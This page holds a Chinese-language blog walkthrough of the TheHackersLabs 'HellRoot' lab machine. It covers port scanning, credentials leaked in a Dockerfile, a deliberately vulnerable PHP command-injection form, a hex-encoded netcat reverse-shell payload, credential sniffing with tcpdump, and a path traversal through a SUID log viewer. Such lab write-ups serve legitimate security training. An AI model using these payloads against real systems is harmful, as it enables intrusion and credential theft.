{"pageProps":{"postData":{"id":"TheHackersLabsHellRoot","contentHtml":"<h1>HellRoot</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/121\">https://labs.thehackerslabs.com/machine/121</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  HellRoot nmap -sT -min-rate 10000 -p- 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:08 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.95\nHost is up (0.00052s latency).\nNot shown: 65530 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n222/tcp  open  rsh-spx\n443/tcp  open  https\n5000/tcp open  upnp\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.73 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  HellRoot nmap -sT -A -p 22,80,222,443,5000 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:09 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.95\nHost is up (0.00076s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey:\n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\n222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)\n443/tcp  open  ssl/http nginx 1.29.0\n| ssl-cert: Subject: commonName=git.hellroot.thl\n| Not valid before: 2025-07-17T18:18:57\n|_Not valid after:  2026-07-17T18:18:57\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n| tls-alpn:\n|   http/1.1\n|   http/1.0\n|_  http/0.9\n|_http-server-header: nginx/1.29.0\n|_http-title: Did not follow redirect to https://git.hellroot.thl/\n5000/tcp open  http     Apache httpd\n|_http-server-header: Apache\n|_http-title: Domain Lookup Service\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.76 ms 192.168.56.95\n</code></pre>\n<p>扫描出来有两个 <code>SSH</code> 服务，三个 <code>Web</code></p>\n<h3>枚举</h3>\n<p><code>192.168.56.5</code> 是 <code>Apache</code> 的默认页面</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image1.png\" alt=\"image.png\"></p>\n<p><code>https://git.hellroot.thl/</code> 是 <code>Gitea</code></p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image2.png\" alt=\"image.png\"></p>\n<p><code>http://git.hellroot.thl:5000/</code> 是域名解析一样的东西</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image3.png\" alt=\"image.png\"></p>\n<p>测试了一下这个功能，貌似是使用 <code>dig</code> 来做域名解析，不过我这里使用仅主机所以无法进行解析</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image4.png\" alt=\"image.png\"></p>\n<p>这里我也尝试了命令拼接，经过简单尝试没有哪里可以进行注入</p>\n<p>来到 <code>gitea</code> 能找到一个项目</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image5.png\" alt=\"image.png\"></p>\n<p>将压缩包下载下来打开，是 <code>5000</code> 端口的源码</p>\n<p>有三个文件</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image6.png\" alt=\"image.png\"></p>\n<p>在 <code>Dockerfile</code> 里面能发现一个用户密码，但是这里使用 <code>SSH</code> 无法进行登录</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># Create user astro with passwordless sudo access only for /bin/su</span>\nRUN useradd -m astro &#x26;&#x26; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"astro:iloveastro\"</span> | chpasswd &#x26;&#x26; \\\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"astro ALL=(ALL:ALL) NOPASSWD: /bin/su\"</span> > /etc/sudoers.d/astro-su &#x26;&#x26; \\\n    <span class=\"hljs-built_in\">chmod</span> 440 /etc/sudoers.d/astro-su\n</code></pre>\n<p>并且 <code>222</code> 端口只能使用私钥进行登录</p>\n<h2>RCE 漏洞</h2>\n<p>下边是<code>index.php</code> 的源码</p>\n<pre><code class=\"hljs language-bash\">&#x3C;main>\n  &#x3C;h1>Domain Lookup Service&#x3C;/h1>\n  &#x3C;form method=<span class=\"hljs-string\">\"POST\"</span> action=<span class=\"hljs-string\">\"\"</span>>\n    &#x3C;label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"domain\"</span>>Enter Domain&#x3C;/label>\n    &#x3C;input <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"domain\"</span> name=<span class=\"hljs-string\">\"domain\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text\"</span> placeholder=<span class=\"hljs-string\">\"example.com\"</span> required autocomplete=<span class=\"hljs-string\">\"off\"</span> />\n    &#x3C;button <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"submit\"</span>>Lookup DNS&#x3C;/button>\n  &#x3C;/form>\n\n&#x3C;?php\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] === <span class=\"hljs-string\">'POST'</span> &#x26;&#x26; !empty(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'domain'</span>])) {\n    <span class=\"hljs-variable\">$input</span> = trim(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'domain'</span>]);\n    <span class=\"hljs-variable\">$decoded</span> = @hex2bin(<span class=\"hljs-variable\">$input</span>);\n\n    // Always show raw output <span class=\"hljs-keyword\">for</span> debugging\n    ob_start();\n\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$decoded</span> !== <span class=\"hljs-literal\">false</span> &#x26;&#x26; ctype_print(<span class=\"hljs-variable\">$decoded</span>)) {\n        <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$decoded</span>, <span class=\"hljs-string\">';'</span>) !== <span class=\"hljs-literal\">false</span>) {\n            // Remove header modification that breaks execution\n            <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-variable\">$decoded</span> . <span class=\"hljs-string\">' 2>&#x26;1'</span>);\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-variable\">$safeDomain</span> = escapeshellarg(<span class=\"hljs-variable\">$decoded</span>);\n            <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-string\">\"nslookup <span class=\"hljs-variable\">$safeDomain</span> 2>&#x26;1\"</span>);\n        }\n    } <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-variable\">$safeDomain</span> = escapeshellarg(<span class=\"hljs-variable\">$input</span>);\n        <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-string\">\"nslookup <span class=\"hljs-variable\">$safeDomain</span> 2>&#x26;1\"</span>);\n    }\n\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;pre class=\"result\">'</span> . htmlspecialchars(<span class=\"hljs-variable\">$output</span> ?: <span class=\"hljs-string\">'No output returned.'</span>) . <span class=\"hljs-string\">'&#x3C;/pre>'</span>;\n    ob_end_flush();\n}\n?>\n</code></pre>\n<p>很明显存在一个<code>RCE</code> 漏洞</p>\n<p>这里接收我们的参数 <code>domain</code> ，然后对其进行<code>16</code>进制编码</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$input</span> = trim(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'domain'</span>]);\n<span class=\"hljs-variable\">$decoded</span> = @hex2bin(<span class=\"hljs-variable\">$input</span>);\n</code></pre>\n<p>然后下边判断解码是否成功，和是否为可以打印字符</p>\n<p>假如我们直接输入字符则进入 <code>else</code></p>\n<pre><code class=\"hljs language-bash\">   <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$decoded</span> !== <span class=\"hljs-literal\">false</span> &#x26;&#x26; ctype_print(<span class=\"hljs-variable\">$decoded</span>)) {\n        <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$decoded</span>, <span class=\"hljs-string\">';'</span>) !== <span class=\"hljs-literal\">false</span>) {\n            // Remove header modification that breaks execution\n            <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-variable\">$decoded</span> . <span class=\"hljs-string\">' 2>&#x26;1'</span>);\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-variable\">$safeDomain</span> = escapeshellarg(<span class=\"hljs-variable\">$decoded</span>);\n            <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-string\">\"nslookup <span class=\"hljs-variable\">$safeDomain</span> 2>&#x26;1\"</span>);\n        }\n    } <span class=\"hljs-keyword\">else</span> {\n\t\t    // 字符直接进入这里\n        <span class=\"hljs-variable\">$safeDomain</span> = escapeshellarg(<span class=\"hljs-variable\">$input</span>);\n        <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-string\">\"nslookup <span class=\"hljs-variable\">$safeDomain</span> 2>&#x26;1\"</span>);\n    }\n</code></pre>\n<p>假如我们输入<code>16</code>进制，并且解码成功就会进入</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$decoded</span>, <span class=\"hljs-string\">';'</span>) !== <span class=\"hljs-literal\">false</span>) {\n            // Remove header modification that breaks execution\n            <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-variable\">$decoded</span> . <span class=\"hljs-string\">' 2>&#x26;1'</span>);\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-variable\">$safeDomain</span> = escapeshellarg(<span class=\"hljs-variable\">$decoded</span>);\n            <span class=\"hljs-variable\">$output</span> = shell_exec(<span class=\"hljs-string\">\"nslookup <span class=\"hljs-variable\">$safeDomain</span> 2>&#x26;1\"</span>);\n        }\n</code></pre>\n<p><code>$output = shell_exec($decoded . ' 2>&#x26;1');</code> ，如果找到了分号，代码会直接将解码后的、未经任何处理的字符串 <code>$decoded</code> 传递给 <code>shell_exec</code> 函数执行</p>\n<p>我们尝试 <code>google.com;nc 192.168.56.5 80</code> ，然后转换为 <code>16</code> 进制</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image7.png\" alt=\"image.png\"></p>\n<p>参数填入 <code>domian</code> 参数后成功执行</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image8.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">google.com;nc 192.168.56.5 1234 -e /bin/bash\n// To hex\n676f6f676c652e636f6d3b6e63203139322e3136382e35362e352031323334202d65202f62696e2f62617368\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image9.png\" alt=\"image.png\"></p>\n<h2>网络嗅探</h2>\n<p>当前我们在 <code>Docker</code> 环境里面</p>\n<pre><code class=\"hljs language-bash\">www-data@05cc10128c04:/home$ <span class=\"hljs-built_in\">ls</span> -la /\ntotal 64\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 .\ndrwxr-xr-x   1 root root 4096 Jul 19 12:49 ..\n-rwxr-xr-x   1 root root    0 Jul 19 12:49 .dockerenv\n</code></pre>\n<p>找到一个文本文件</p>\n<pre><code class=\"hljs language-bash\">www-data@05cc10128c04:/var/www/html$ <span class=\"hljs-built_in\">cat</span> sniff.txt \nPuede que haya ciertas herramientas que te permitan esnifar el trafico.\n</code></pre>\n<blockquote>\n<p>可能存在某些工具可以让你嗅探流量。</p>\n</blockquote>\n<p>隐藏的 <code>.config</code> 文件夹</p>\n<pre><code class=\"hljs language-bash\">www-data@05cc10128c04:/var/www/html/.config$\n</code></pre>\n<p>里面有 <code>dpkg</code> 的信息，能看到有 <code>tcpdump</code></p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image10.png\" alt=\"image.png\"></p>\n<p>使用上面的得到的凭据切换用户</p>\n<pre><code class=\"hljs language-bash\">www-data@05cc10128c04:/home$ su astro \nPassword: \n$ <span class=\"hljs-built_in\">id</span>\nuid=1001(astro) gid=1001(astro) <span class=\"hljs-built_in\">groups</span>=1001(astro)\n</code></pre>\n<p>再根据 <code>sudo -l</code> 的权限，可以直接切换到 <code>root</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> astro on 05cc10128c04:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser astro may run the following commands on 05cc10128c04:\n    (ALL : ALL) NOPASSWD: /bin/su\n$ <span class=\"hljs-built_in\">sudo</span> su root\nroot@05cc10128c04:/home# \n</code></pre>\n<p>我们再根据上边的文件进行网络嗅探</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image11.png\" alt=\"image.png\"></p>\n<p>但是直接抓并不能抓到什么有用的，想起来 <code>Gitea</code> 可以进行登录</p>\n<p>先提前开启抓包，然后在网站上个使用凭据登录</p>\n<pre><code class=\"hljs language-scheme\">tcpdump -i eth0 -A -w 1.pcap\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image12.png\" alt=\"image.png\"></p>\n<p>然后直接查看数据包，能得到一个凭据</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image13.png\" alt=\"image.png\"></p>\n<p>但一开始并没想到这个是密码，因为我认为这是前端传过来加密数据</p>\n<p>然后在 <code>ssh</code> 进行密码碰撞，成功登录进去了</p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image14.png\" alt=\"image.png\"></p>\n<p>能读取到 <code>user.txt</code></p>\n<p><img src=\"/post-images/TheHackersLabsHellRoot/image15.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<p>寻找存在 <code>suid</code> 权限的程序</p>\n<pre><code class=\"hljs language-scheme\">astro@hellroot:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/local/bin/secmonitor\n/usr/local/bin/logview\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n</code></pre>\n<p>有两个奇怪的程序 <code>logview</code> 和 <code>secmonitor</code></p>\n<p><code>logview</code> 能直接读文件，直接读 <code>root.txt</code></p>\n<pre><code class=\"hljs language-scheme\">astro@hellroot:~$ logview ../../root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log/../../root/root.txt\nf03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>","title":"TheHackersLabs - HellRoot","date":"2025-08-02","updated":"2025-08-02","tags":["TheHackersLabs","Linux","RCE","Logview"],"categories":"靶机","comments":true,"description":"HellRoot\n\n https://labs.thehackerslabs.com/machine/121\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n扫描出来有两个 `SSH` 服务，三个 `Web`\n\n枚举\n\n`192.168.56.5` 是 `Apache` 的默认页面\n\n\n\n`https://git.hellroot.thl/` 是 `Gitea`\n\n\n\n`http://git...."},"recentPosts":[{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"}]},"__N_SSG":true}